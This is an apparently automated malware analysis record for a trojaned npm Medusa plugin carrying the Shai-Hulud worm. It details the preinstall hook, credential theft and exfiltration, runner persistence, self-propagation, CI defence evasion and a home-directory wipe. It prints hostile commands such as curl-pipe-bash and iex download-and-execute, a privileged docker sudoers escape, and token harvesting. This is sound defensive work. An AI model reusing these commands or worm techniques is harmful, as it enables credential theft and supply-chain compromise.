# npm @kvytech/medusa-plugin-product-reviews@0.0.9

**Source:** datadog · **Source label:** malicious · **Released:** 2025-11-24 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-4-8)

## Summary

A legitimate Medusa plugin (`@kvytech/medusa-plugin-product-reviews`) was trojaned with a `preinstall` hook, `node setup_bun.js`, that runs on every registry install. `setup_bun.js` installs the Bun runtime (Windows: `powershell irm bun.sh/install.ps1|iex`; else `curl -fsSL bun.sh/install | bash`), refreshes PATH, then spawns `bun bun_environment.js` — a 10 MB obfuscator.io-packed worm (the Shai-Hulud "Second Coming" campaign). The worm harvests GitHub, npm and AWS/GCP/Azure credentials, exfiltrates them plus system/cloud/secret data to a newly created GitHub repo, registers a self-hosted GitHub Actions runner named "SHA1HULUD" for persistence, commits malicious workflows to steal other repos' Actions secrets, and republishes trojaned versions of the maintainer's packages (self-propagation). Two environmental gates are recorded: on a GitHub Actions Linux runner with a `/home/agent/agent` process and passwordless sudo (or, if the sudo probe throws, a docker fallback) it disables systemd-resolved and flushes iptables (defense evasion, g1); and when there is no usable GitHub credential (no token, or the exfil repo could not be created), no npm token in the environment or `.npmrc`, and no token can be pulled from other infected repos, it wipes the user's home directory (destructive, g2).

## Execution

- **preinstall** `node setup_bun.js`: 2-file chain; direct_script, shell_pipe, download_then_exec, detached_child, decoded_eval; errors hidden.
- **prepare** `cross-env NODE_ENV=production yarn run build:server && medusa-admin bundle`: runs on git or local install only; no package files; inline_shell.

## Gates

| gate | hook | expression | branch | min | behaviours | recipe |
|---|---|---|---|---|---|---|
| g1 | preinstall | c1 && c2 && c3 && (c4 \|\| c8) (c1: process.env.GITHUB_ACTIONS truthy; c2: process.env.RUNNER_OS == Linux; c3: process_list exists; c4: privilege exists; c8: privilege exists) | then | 4 | defense_evasion | os=linux; env_var=GITHUB_ACTIONS=(set), RUNNER_OS=Linux; privilege=root_or_admin; ci=github_actions |
| g2 | preinstall | ((c5 && c11) \|\| c9) && c6 && c7 && c10 (c5: process.env not_startswith [ghp_, gho_]; c11: target_artifact not_startswith [gho_, ghp_]; c9: server_response falsy; c6: server_response falsy; c7: process.env.NPM_TOKEN falsy; c10: target_artifact falsy) | then | 4 | destructive | env_var_absent=NPM_TOKEN; file_absent=~/.npmrc, .npmrc |

Gate intent: g1 evade/enables/anti_analysis; g2 activate/enables/data_availability

Grounding: 4 of 11 conditions and 0 of 2 gates from the candidate set; out of set, pending verification: c5, c6, c7, c8, c9, c10, c11, g1, g2.

## Requirements

- network: bun[.]sh:443, api[.]github[.]com:443, raw[.]githubusercontent[.]com:443, registry[.]npmjs[.]org:443 (Install downloads the Bun runtime from bun.sh, reads other infected repos' tokens from raw.githubusercontent.com, talks to the GitHub API (repo creation, Actions secrets, runner registration), and validates/republishes via the npm registry.)
- installed_tool: curl, bash (On unix the bun bootstrap runs `curl -fsSL bun.sh/install | bash`, and the payload shells out via bash (Bun.$ / spawn).)

## Behaviour

- Ungated: recon, cred_read, exfil, download, exec_downloaded, spawn_process, write_file
- Gated: defense_evasion, destructive

## Notes

- Coverage: `setup_bun.js` read in full. `bun_environment.js` string table recovered via derivation d1 (rotation checksum matched); worm package code read in full (entry `jy1`->`aL0`; classes `dq` GitHub, `mq` Actions-secrets, `Wl` npm, `Tl` trufflehog, `WX` AWS, `Hw` GCP, `Eq` Azure); bundled SDKs (grpc, google-cloud, azure-identity, aws-sdk, octokit, protobuf, bottleneck, semver) audited by sink inventory with no unexplained hits. The `not_chained` entry for bun_environment.js is resolved: setup_bun.js launches it at install, so it is added to the preinstall file_chain.
- The setup_bun.js os/path candidate gates (g1-g5 in the candidate set) are plumbing — win32-vs-unix only picks the bun install command/shell and PATH handling while the download+exec of Bun and the payload launch happen on every OS — so they were dropped as not_environmental.
- The CI-vs-background decision in `jy1` and the `POSTINSTALL_BG=1` re-entry marker are not gates: they only detach the same payload into the background (re-entry guard), noted in execution.notes.
- Only Bun.$/Bun.spawnSync exec sinks were flagged by the extractor in the payload, so the credential-gated exfil (octokit `saveContents`/`fetch`), self-propagation (`npm publish`) and runner persistence are documented in execution.notes rather than carried as gate payloads. g1/g2 and conditions c5-c11 are out-of-set (analyst-added), hence manual review.
- g1 stays `evade`: the gate's own definition covers disabling monitoring it detects, and gQ0 flushes the egress filter chains and replaces the resolver config once the `/home/agent/agent` process is seen on a CI runner.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "@kvytech/medusa-plugin-product-reviews",
    "version": "0.0.9",
    "archive_sha256": "0072d2ea50a2835ee1c6138bbac2230310eebd11c6be2cf8f750b922c7fd43f7",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-11-24",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/compromised_lib/2025-11-24-@kvytech_medusa-plugin-product-reviews-v0.0.9.zip",
    "package_root": "layer0/tmp/tmp1j2llle1/@kvytech-medusa-plugin-product-reviews/package",
    "cluster_key": "6bd42a420d250dc6592ce07f3a030d487ed3f5fe328eef165cffcee545bb333c",
    "analysis_type": "ai",
    "model_name": "claude-opus-4-8"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "node setup_bun.js",
        "runs_on": "always",
        "file_chain": [
          "setup_bun.js",
          "bun_environment.js"
        ],
        "interpreter": "node",
        "launch_style": [
          "direct_script",
          "shell_pipe",
          "download_then_exec",
          "detached_child",
          "decoded_eval"
        ],
        "silent_failure": true
      },
      {
        "hook": "prepare",
        "command": "cross-env NODE_ENV=production yarn run build:server && medusa-admin bundle",
        "runs_on": "git_or_local_install_only",
        "file_chain": [],
        "interpreter": "other",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "prepare: runs 'tsc' from a dependency or the system; its code is out of scope",
      "prepare: runs 'medusa-admin' from a dependency or the system; its code is out of scope",
      "setup_bun.js: read in full. Installs Bun (win32: powershell irm bun.sh/install.ps1|iex; else: curl -fsSL bun.sh/install | bash), refreshes PATH, then spawns `bun bun_environment.js`. The bun_environment.js launch at setup_bun.js:182 is now chained.",
      "bun_environment.js: resolved not_chained; setup_bun.js runs it at install via spawn(bun,[bun_environment.js]). Added to the preinstall file_chain.",
      "bun_environment.js: string table decoded via derivation d1 (rotation checksum matched). Worm package code read in full: entry jy1->aL0, classes dq/mq/Wl/Tl/WX/Hw/Eq, helpers Ry1/ky1/cQ0/pQ0/gQ0/El/oL0.",
      "bun_environment.js: bundled SDKs (grpc, google-cloud, azure-identity, aws-sdk, octokit, protobuf, bottleneck, semver) audited by sink inventory; all hits are library behaviour, nothing unread.",
      "setup_bun.js os/path branches (dropped g1-g5 candidates) are plumbing: win32-vs-unix only selects the bun install command/shell and PATH handling; the download+exec of Bun and the payload launch run on every OS.",
      "Re-entry guard (not a gate): jy1 respawns itself detached with env POSTINSTALL_BG=1 when not in CI (Bun.spawn(execPath,[argv1]).unref()); the child then runs aL0 once.",
      "exfil/self_propagation/persistence are credential-or-scope gated and run through octokit/npm/cloud network calls not flagged as sinks, so they are documented here not gate-anchored.",
      "github token present -> create attacker GitHub repo; upload stolen system/cloud/github data; register self-hosted runner 'SHA1HULUD'; commit malicious workflows to steal other repos' Actions secrets. npm token valid -> republish trojaned maintainer packages (worm).",
      "Unconditional at install: recon (system info), cred_read (.npmrc, ghp_/gho_ env, gh auth token, AWS/GCP/Azure secret enumeration via cloud metadata), download (bun, trufflehog), trufflehog filesystem scan of $HOME.",
      "g1: pQ0 returns true on sudo -n true exit 0 (c4), or, only when that probe throws, when the docker fallback does not throw (c8). The docker call uses nothrow, so its exit status is not tested. c8 is therefore only reachable after c4's probe threw.",
      "g2: the outer test is !isAuthenticated() || !repoExists(). isAuthenticated() is !!token, and token comes from a process.env value starting ghp_/gho_ (c5) or gh auth token output (c11). repoExists() is gitRepo !== null, set only by a successful createRepo (c9).",
      "g2: the npm binding is process.env.NPM_TOKEN, then oL0() (cwd and home .npmrc) when that is empty, so both sources must be empty (c7, c10). The recipe cannot express c5 (env values by prefix, any name) or c11 (no gh login); a stock sandbox satisfies both."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": [
        "bun[.]sh:443",
        "api[.]github[.]com:443",
        "raw[.]githubusercontent[.]com:443",
        "registry[.]npmjs[.]org:443"
      ],
      "reason": "Install downloads the Bun runtime from bun.sh, reads other infected repos' tokens from raw.githubusercontent.com, talks to the GitHub API (repo creation, Actions secrets, runner registration), and validates/republishes via the npm registry."
    },
    {
      "axis": "installed_tool",
      "value": [
        "curl",
        "bash"
      ],
      "reason": "On unix the bun bootstrap runs `curl -fsSL bun.sh/install | bash`, and the payload shells out via bash (Bun.$ / spawn)."
    }
  ],
  "conditions": [
    {
      "id": "c1",
      "category": "ci_marker",
      "api": "process.env.GITHUB_ACTIONS",
      "operator": "truthy",
      "value": null,
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": "k_b166e60983",
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9403708,
            "end_byte": 9403740,
            "node_type": "subscript_expression",
            "sha256": "9871240e9d135b2b",
            "line": 1
          }
        }
      ],
      "provenance": "in_set"
    },
    {
      "id": "c2",
      "category": "ci_marker",
      "api": "process.env.RUNNER_OS",
      "operator": "==",
      "value": "Linux",
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": "k_9ff139d960",
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9403742,
            "end_byte": 9403779,
            "node_type": "binary_expression",
            "sha256": "0a604416ad1db2b0",
            "line": 1
          }
        }
      ],
      "provenance": "in_set"
    },
    {
      "id": "c3",
      "category": "process_list",
      "api": "Bun.$",
      "operator": "exists",
      "value": null,
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": "k_8146dd1035",
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 8919216,
            "end_byte": 8919269,
            "node_type": "call_expression",
            "sha256": "4c25ddb99e78903a",
            "line": 1
          }
        }
      ],
      "provenance": "in_set",
      "probe": {
        "kind": "exec",
        "callee": "Bun.$",
        "target": "ps -axco command | grep \"/home/agent/agent\"",
        "accessor": "stdout"
      }
    },
    {
      "id": "c4",
      "category": "privilege",
      "api": "Bun.$",
      "operator": "exists",
      "value": null,
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": "k_78a5a57399",
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 8919641,
            "end_byte": 8919663,
            "node_type": "call_expression",
            "sha256": "c376285de89a8a95",
            "line": 1
          }
        }
      ],
      "provenance": "in_set",
      "probe": {
        "kind": "exec",
        "callee": "Bun.$",
        "target": "sudo -n true",
        "accessor": "returncode"
      }
    },
    {
      "id": "c5",
      "category": "env_var",
      "api": "process.env",
      "operator": "not_startswith",
      "value": [
        "ghp_",
        "gho_"
      ],
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9138284,
            "end_byte": 9138318,
            "node_type": "call_expression",
            "sha256": "617707b1a2be8924",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set"
    },
    {
      "id": "c6",
      "category": "server_response",
      "api": "dq.fetchToken",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "in_scope": false,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405494,
            "end_byte": 9405519,
            "node_type": "call_expression",
            "sha256": "70aa9a4ff3a8972d",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set"
    },
    {
      "id": "c7",
      "category": "env_var",
      "api": "process.env.NPM_TOKEN",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405246,
            "end_byte": 9405273,
            "node_type": "subscript_expression",
            "sha256": "7fd2bb3f0c6c093e",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set"
    },
    {
      "id": "c8",
      "category": "privilege",
      "api": "Bun.$",
      "operator": "exists",
      "value": null,
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 8919851,
            "end_byte": 8919964,
            "node_type": "call_expression",
            "sha256": "36912043cba07f71",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set",
      "probe": {
        "kind": "exec",
        "callee": "Bun.$",
        "target": "docker run --rm --privileged -v /:/host ubuntu bash -c \"cp /host/tmp/runner /host/etc/sudoers.d/runner\"",
        "accessor": "throws"
      }
    },
    {
      "id": "c9",
      "category": "server_response",
      "api": "dq.repoExists",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "in_scope": false,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405446,
            "end_byte": 9405472,
            "node_type": "unary_expression",
            "sha256": "48a32c8e6b4838bb",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set"
    },
    {
      "id": "c10",
      "category": "target_artifact",
      "api": "oL0",
      "operator": "falsy",
      "value": null,
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405298,
            "end_byte": 9405309,
            "node_type": "await_expression",
            "sha256": "2830e4878836e7b0",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set",
      "probe": {
        "kind": "file",
        "callee": "mL0",
        "target": "*/.npmrc",
        "accessor": "content"
      }
    },
    {
      "id": "c11",
      "category": "target_artifact",
      "api": "Bun.spawnSync",
      "operator": "not_startswith",
      "value": [
        "gho_",
        "ghp_"
      ],
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": null,
          "anchor": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9138720,
            "end_byte": 9138784,
            "node_type": "binary_expression",
            "sha256": "050d289d73020974",
            "line": 1
          }
        }
      ],
      "provenance": "out_of_set",
      "probe": {
        "kind": "exec",
        "callee": "Bun.spawnSync",
        "target": "gh auth token",
        "accessor": "stdout"
      }
    }
  ],
  "gates": [
    {
      "gate_id": "g1",
      "hook": "preinstall",
      "expression": "c1 && c2 && c3 && (c4 || c8)",
      "guards": [
        {
          "candidate": "q_8116c95fa1",
          "site": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9403705,
            "end_byte": 9404054,
            "node_type": "if_statement",
            "sha256": "7b019cc2bba25f5a",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c1",
            "c2"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9404012,
            "end_byte": 9404052,
            "node_type": "if_statement",
            "sha256": "7d0abbfaace97ecd",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c3",
            "c4",
            "c8"
          ]
        }
      ],
      "provenance": "out_of_set",
      "polarity": "evade",
      "effect": "enables",
      "purpose": "anti_analysis",
      "purpose_reason": "On a GitHub Actions Linux runner where a /home/agent/agent process runs and passwordless sudo (or a privileged docker escape) is available, it stops systemd-resolved, overwrites resolved.conf and flushes iptables OUTPUT/DOCKER-USER chains to remove network monitoring and filtering.",
      "then": {
        "min_conditions": 4,
        "behaviours": [
          "defense_evasion"
        ],
        "env_recipe": {
          "os": "linux",
          "env_var": {
            "GITHUB_ACTIONS": null,
            "RUNNER_OS": "Linux"
          },
          "privilege": "root_or_admin",
          "ci": "github_actions"
        },
        "recipe_guessed_fields": [
          "privilege"
        ],
        "regions": [
          {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9404046,
            "end_byte": 9404051,
            "node_type": "call_expression",
            "sha256": "153f29fd30826c3e",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "defense_evasion",
            "sink_kind": "exec",
            "sink": {
              "file": "bun_environment.js",
              "derived_from": "d1",
              "start_byte": 8920063,
              "end_byte": 8920109,
              "node_type": "call_expression",
              "sha256": "353341125db00e2f",
              "line": 1
            },
            "witness": [
              {
                "hop": "def",
                "anchor": {
                  "file": "bun_environment.js",
                  "derived_from": "d1",
                  "start_byte": 8920010,
                  "end_byte": 8920407,
                  "node_type": "function_declaration",
                  "sha256": "60aaa6223fb2b957",
                  "line": 1
                }
              }
            ]
          }
        ]
      },
      "else": null
    },
    {
      "gate_id": "g2",
      "hook": "preinstall",
      "expression": "((c5 && c11) || c9) && c6 && c7 && c10",
      "guards": [
        {
          "candidate": null,
          "site": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405410,
            "end_byte": 9406221,
            "node_type": "if_statement",
            "sha256": "48061b835d3b62d6",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c5",
            "c11",
            "c9"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405520,
            "end_byte": 9406220,
            "node_type": "if_statement",
            "sha256": "150f7910a0a3b437",
            "line": 1
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c6"
          ]
        },
        {
          "candidate": null,
          "site": {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405535,
            "end_byte": 9406129,
            "node_type": "if_statement",
            "sha256": "aeac809a479ff964",
            "line": 1
          },
          "kind": "if",
          "arm": "else",
          "conditions": [
            "c7",
            "c10"
          ]
        }
      ],
      "provenance": "out_of_set",
      "polarity": "activate",
      "effect": "enables",
      "purpose": "data_availability",
      "purpose_reason": "When there is no usable GitHub credential (no ghp_/gho_ env value and no gh CLI token, or the exfil repo could not be created), no token is recovered from other infected repos, and no npm token (env or .npmrc) exists, it destroys the victim's home directory and exits.",
      "then": {
        "min_conditions": 4,
        "behaviours": [
          "destructive"
        ],
        "env_recipe": {
          "env_var_absent": [
            "NPM_TOKEN"
          ],
          "file_absent": [
            "~/.npmrc",
            ".npmrc"
          ]
        },
        "recipe_guessed_fields": [],
        "regions": [
          {
            "file": "bun_environment.js",
            "derived_from": "d1",
            "start_byte": 9405594,
            "end_byte": 9406096,
            "node_type": "statement_block",
            "sha256": "b1ef9ded378f3677",
            "line": 1
          }
        ],
        "payload": [
          {
            "behaviour": "destructive",
            "sink_kind": "exec",
            "sink": {
              "file": "bun_environment.js",
              "derived_from": "d1",
              "start_byte": 9405659,
              "end_byte": 9405811,
              "node_type": "call_expression",
              "sha256": "9ca151b4156f15a7",
              "line": 1
            },
            "witness": []
          }
        ]
      },
      "else": null
    }
  ],
  "behaviours": {
    "ungated": [
      "recon",
      "cred_read",
      "exfil",
      "download",
      "exec_downloaded",
      "spawn_process",
      "write_file"
    ],
    "gated": [
      "defense_evasion",
      "destructive"
    ]
  },
  "obfuscation": {
    "level": "heavy",
    "techniques": [
      "string array (obfuscator.io, recovered via d1)",
      "hex identifiers",
      "escaped strings",
      "opaque predicate dead-code branches (constant string equality)",
      "dynamic eval (Function)",
      "very long single-line bundle",
      "bundled with large legitimate SDKs"
    ],
    "decoded": true,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://bun[.]sh/install",
        "role": "second_stage"
      },
      {
        "indicator": "hxxps://api[.]github[.]com",
        "role": "c2"
      },
      {
        "indicator": "hxxps://raw[.]githubusercontent[.]com/",
        "role": "second_stage"
      },
      {
        "indicator": "hxxps://registry[.]npmjs[.]org",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://api[.]github[.]com/repos/trufflesecurity/trufflehog/releases/latest",
        "role": "second_stage"
      },
      {
        "indicator": "hxxps://github[.]com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz",
        "role": "second_stage"
      },
      {
        "indicator": "hxxp://169[.]254[.]169[.]254",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxp://metadata[.]google[.]internal[.]",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://oauth2[.]googleapis[.]com/token",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://login[.]microsoftonline[.]com",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://sts[.]amazonaws[.]com",
        "role": "exfil_sink"
      },
      {
        "indicator": "hxxps://vault[.]azure[.]net/.default",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "compromised_maintainer",
  "family_hint": "shai-hulud",
  "claude_assessment": "malicious",
  "assessment_reason": "A legitimate Medusa plugin was trojaned with a preinstall hook (node setup_bun.js) that installs the Bun runtime and runs a 10 MB obfuscated worm (bun_environment.js). The worm steals GitHub/npm/AWS/GCP/Azure credentials, exfiltrates them to an attacker-created GitHub repo, registers a self-hosted runner for persistence, worms into the maintainer's other npm packages, disables DNS/firewall on CI runners, and wipes the home directory when no credentials are found. This is the Shai-Hulud 'Second Coming' campaign.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": true,
  "review_reasons": [
    "Out-of-set gates and conditions (g1/g2, c5-c11) added by analyst with null candidates.",
    "env_recipe field guessed for g1 (privilege) because the check is a sudo probe, not a fixed user.",
    "c6 and c9 are server_response checks (fetchToken from other infected repos, createRepo success) kept in the g2 expression but out of scope.",
    "exfil/self_propagation/persistence run via octokit/npm/cloud network calls not flagged as sinks, so they are documented in notes rather than gate-anchored.",
    "guessed recipe fields",
    "out-of-set claim pending verification"
  ],
  "normalisation": {
    "derivations": [
      {
        "id": "d1",
        "recipe": "obfuscatorio_strings",
        "recipe_version": 1,
        "input": {
          "file": "bun_environment.js",
          "derived_from": null
        },
        "params": {
          "provider": "a0_0x29d6",
          "decoder": "a0_0x5155",
          "offset": 443,
          "variant": "none",
          "form": "v2",
          "table_size": 24475,
          "rotations": 127,
          "checksum_target": 807392,
          "callables": 14042
        },
        "output_sha256": "791445f178c2a4b7",
        "stats": {
          "calls_total": 182246,
          "substituted": 182246,
          "unresolved": 0
        }
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@432915badc",
      "sha256": "99784e3eb649e3ea"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": [
      {
        "candidate": "k_fb9a5db8df",
        "reason_code": "not_environmental",
        "note": "ternary picking 'where bun' vs 'which bun'; tool lookup for the bun bootstrap, not an environment gate",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 210,
          "end_byte": 238,
          "node_type": "binary_expression",
          "sha256": "67d640affd7c71c5",
          "line": 9
        }
      },
      {
        "candidate": "k_9f2314f1be",
        "reason_code": "not_environmental",
        "note": "platform check only selects powershell vs curl|bash to install bun; the install runs regardless",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 2072,
          "end_byte": 2100,
          "node_type": "binary_expression",
          "sha256": "67d640affd7c71c5",
          "line": 69
        }
      },
      {
        "candidate": "k_8243b60281",
        "reason_code": "not_environmental",
        "note": "platform branch in reloadPath; PATH refresh plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 434,
          "end_byte": 462,
          "node_type": "binary_expression",
          "sha256": "67d640affd7c71c5",
          "line": 19
        }
      },
      {
        "candidate": "k_e0dfd8b59b",
        "reason_code": "not_environmental",
        "note": "platform branch in findBunExecutable; locating bun, plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 2856,
          "end_byte": 2884,
          "node_type": "binary_expression",
          "sha256": "67d640affd7c71c5",
          "line": 101
        }
      },
      {
        "candidate": "k_d36ad8d600",
        "reason_code": "not_environmental",
        "note": "profile-file existsSync in reloadPath; PATH refresh plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 1237,
          "end_byte": 1263,
          "node_type": "call_expression",
          "sha256": "c71212927f1a7da1",
          "line": 41
        }
      },
      {
        "candidate": "k_997be1f6bc",
        "reason_code": "not_environmental",
        "note": "bunPath existsSync in findBunExecutable; locating bun, plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 3501,
          "end_byte": 3523,
          "node_type": "call_expression",
          "sha256": "e59b9a241f35f5bf",
          "line": 125
        }
      },
      {
        "candidate": "k_50e0566ba2",
        "reason_code": "not_environmental",
        "note": "~/.bun/bin existsSync; PATH plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 1838,
          "end_byte": 1862,
          "node_type": "call_expression",
          "sha256": "9027b0f47426878e",
          "line": 59
        }
      },
      {
        "candidate": "k_7f3e4e84a7",
        "reason_code": "not_environmental",
        "note": "PATH.includes check; PATH plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 1867,
          "end_byte": 1903,
          "node_type": "call_expression",
          "sha256": "5b6cc47daf2bdfa5",
          "line": 59
        }
      },
      {
        "candidate": "k_8f3faff9a0",
        "reason_code": "not_environmental",
        "note": "existsSync of the package's own bundled bun_environment.js before launching it; always present, launch is ungated",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 4781,
          "end_byte": 4813,
          "node_type": "call_expression",
          "sha256": "ba53a73f09185f0a",
          "line": 181
        }
      },
      {
        "candidate": "q_85ff2db321",
        "reason_code": "not_environmental",
        "note": "ternary where/which bun; tool lookup plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 210,
          "end_byte": 266,
          "node_type": "ternary_expression",
          "sha256": "f940ca7f22f7ec10",
          "line": 9
        }
      },
      {
        "candidate": "q_d71e66e7e1",
        "reason_code": "not_environmental",
        "note": "win32 vs unix only selects the bun install command; download+exec of bun runs regardless",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 2068,
          "end_byte": 2329,
          "node_type": "if_statement",
          "sha256": "cda6b5855c483f73",
          "line": 69
        }
      },
      {
        "candidate": "q_53e1d98b0c",
        "reason_code": "not_environmental",
        "note": "reloadPath win32 branch; PATH refresh plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 430,
          "end_byte": 1996,
          "node_type": "if_statement",
          "sha256": "b3662ca0a3d1e57b",
          "line": 19
        }
      },
      {
        "candidate": "q_fd4553b6fa",
        "reason_code": "not_environmental",
        "note": "findBunExecutable win32 branch; locating bun, plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 2852,
          "end_byte": 3324,
          "node_type": "if_statement",
          "sha256": "4db85fce860c9312",
          "line": 101
        }
      },
      {
        "candidate": "q_98259f004c",
        "reason_code": "not_environmental",
        "note": "reloadPath non-win32 branch; PATH refresh plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 430,
          "end_byte": 1996,
          "node_type": "if_statement",
          "sha256": "b3662ca0a3d1e57b",
          "line": 19
        }
      },
      {
        "candidate": "q_d012987235",
        "reason_code": "not_environmental",
        "note": "profile-file existsSync branch; PATH refresh plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 1233,
          "end_byte": 1678,
          "node_type": "if_statement",
          "sha256": "d65ee713ed1c03fb",
          "line": 41
        }
      },
      {
        "candidate": "q_e8c9ed15f1",
        "reason_code": "not_environmental",
        "note": "~/.bun/bin PATH-add branch; plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 1834,
          "end_byte": 1977,
          "node_type": "if_statement",
          "sha256": "4b86cbaf58ead841",
          "line": 59
        }
      },
      {
        "candidate": "q_af02d7c460",
        "reason_code": "not_environmental",
        "note": "bunPath existsSync branch; locating bun, plumbing",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 3497,
          "end_byte": 3554,
          "node_type": "if_statement",
          "sha256": "3792818e41453049",
          "line": 125
        }
      },
      {
        "candidate": "q_ba68018d36",
        "reason_code": "not_environmental",
        "note": "launches the package's own payload when present; not an environment decision",
        "anchor": {
          "file": "setup_bun.js",
          "derived_from": null,
          "start_byte": 4777,
          "end_byte": 4907,
          "node_type": "if_statement",
          "sha256": "d69fd304cc618579",
          "line": 181
        }
      }
    ]
  },
  "candidate_check": {
    "condition_candidates": 10,
    "condition_sites_cited": 4,
    "guards_cited": 1,
    "candidates_dropped": 18,
    "conditions_in_set": 4,
    "conditions_out_of_set": 7,
    "guard_candidates": 71,
    "gates_in_set": 0,
    "gates_out_of_set": 2,
    "out_of_set_ids": [
      "c5",
      "c6",
      "c7",
      "c8",
      "c9",
      "c10",
      "c11",
      "g1",
      "g2"
    ],
    "anchor_refusals": 0
  }
}
```
